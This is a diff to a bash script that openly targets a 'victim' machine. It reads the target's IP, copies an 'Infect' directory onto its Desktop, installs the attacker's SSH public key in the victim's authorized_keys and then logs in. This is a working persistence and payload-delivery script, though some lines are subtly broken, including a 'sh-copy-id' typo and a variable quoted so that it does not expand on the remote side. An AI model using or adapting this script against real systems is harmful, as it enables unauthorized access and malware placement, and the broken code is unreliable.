@@ -21,12 +21,14 @@ read -p "Enter Victim IP Address: " IP_Address
 scp -r ./Infect victim@"$IP_Address":/home/victim/Desktop/
 
 # publickey
-mkdir -p ~/.ssh
-chmod 700 ~/.ssh
+SSH_PATH="/home/victim/.ssh"
+#mkdir -p /home/victim/.ssh
+
+chmod 700 "$SSH_PATH"
 ssh-keygen
-ssh victim@"$IP_Address" 'mkdir -p ~/.ssh;cat >> ~/.ssh/authorized_keys' < ~/.ssh/id_rsa.pub
+ssh victim@"$IP_Address" 'mkdir -p "$SSH_PATH";cat >> "$SSH_PATH"/authorized_keys' < "$SSH_PATH"/id_rsa.pub
 ssh-copy-id victim@"$IP_Address"
-sh-copy-id -i ~/.ssh/id_rsa.pub victim@"$IP_Address"
+sh-copy-id -i "$SSH_PATH"/id_rsa.pub victim@"$IP_Address"
 ssh victim@"$IP_Address"
 
 
